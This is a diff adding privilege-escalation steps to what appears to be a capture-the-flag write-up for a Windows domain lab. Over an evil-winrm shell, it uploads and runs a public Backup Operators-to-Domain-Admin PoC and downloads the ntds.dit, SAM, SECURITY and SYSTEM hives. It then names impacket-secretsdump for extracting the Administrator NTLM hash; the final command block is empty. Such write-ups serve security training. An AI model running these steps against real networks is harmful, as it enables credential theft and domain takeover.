@@ -264,21 +264,32 @@ evil-winrm-py PS C:\Users\svc_backup\Documents> type ../desktop/user.txt
 
 **Exploitation steps:**
 
-**Step 1:**
+**Step 1:** Upload the PoC [Script](https://github.com/G4sp4rCS/backup-operator-to-domain-admin-POC)
 ```bash
 # Command
+evil-winrm-py PS C:\Users\svc_backup\Documents> upload ../../../../../home/Yuval/Tools/backup-operator-to-domain-admin-POC/backupToDA.ps1 .
 ```
 
-**Step 2:**
+**Step 2:** Run the PoC
 ```bash
 # Command
+.\backupToDA.ps1
 ```
 
-**Step 3:**
+**Step 3:** Download all the extracted hives
 ```bash
 # Command
+evil-winrm-py PS C:\Users\svc_backup\Documents> download ntds\ntds.dit .
+evil-winrm-py PS C:\Users\svc_backup\Documents> download SAM .
+evil-winrm-py PS C:\Users\svc_backup\Documents> download SECURITY .
+evil-winrm-py PS C:\Users\svc_backup\Documents> download SYSTEM .
 ```
 
+**Step 4: run `impacket-secretsdump` to parse the hives and get the `Administrator` NTLM hash.
+```bash
+# Command
+
+```
 <div class="divider divider-root">
     <span class="divider-title">Root Access</span>
     <span class="divider-content">Successfully escalated privileges to root</span>
